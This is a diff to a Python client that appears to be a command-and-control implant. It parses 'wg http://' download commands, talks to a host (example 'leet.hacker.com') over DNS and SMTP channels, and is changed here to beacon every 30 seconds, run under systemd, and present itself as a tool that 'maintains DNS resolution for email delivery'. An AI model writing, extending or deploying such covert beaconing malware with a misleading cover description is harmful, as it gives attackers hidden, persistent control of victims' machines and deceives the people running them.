@@ -23,6 +23,8 @@ import subprocess
 import urllib.request
 import os
 import sys
+import argparse
+import time
 
 def wget(cmd):
     #parse a "wg http://..." command
@@ -654,14 +656,28 @@ def guessDest():
 def main():
     smtpDest = ""
     dnsDest = ""
-    if len(sys.argv) < 2:
-        smtpDest,dnsDest = guessDest()
-    else:
-        smtpDest = sys.argv[1] #argv = "both_client.py","leet.hacker.com"
-        dnsDest = sys.argv[1]
-    dnsRun(dnsDest)
-    if smtpDest != None and smtpDest != "" and not dnsResult:
-        smtpRun(smtpDest)
+    smtpDest,dnsDest = guessDest() #let's guess a resolver and then overwrite if the args say otherwise
+
+    parser = argparse.ArgumentParser(description='Maintains DNS resolution for email delivery.')
+    parser.add_argument("--systemd", help="Take input and timing from SystemD rather than running automatically by itself.", action="store_true")
+    parser.add_argument('-D', "--dns", help="Only use DNS", action="store_true")
+    parser.add_argument("-S", "--smtp", help="Only use SMTP", action="store_true")
+    parser.add_argument('hostname', help="The hostname or IP of the destination server")
+    args = parser.parse_args()
+
+    if args.hostname is not None and args.hostname != "":
+        smtpDest = args.hostname
+        dnsDest = args.hostname
+
+    while True:
+        if args.dns:
+            dnsRun(dnsDest)
+        if args.smtp:
+            smtpRun(smtpDest)
+        if args.systemd:
+            # running from systemd, don't enable timed autorun
+            exit(0)
+        time.sleep(30)
 
 if __name__ == "__main__":
     main()
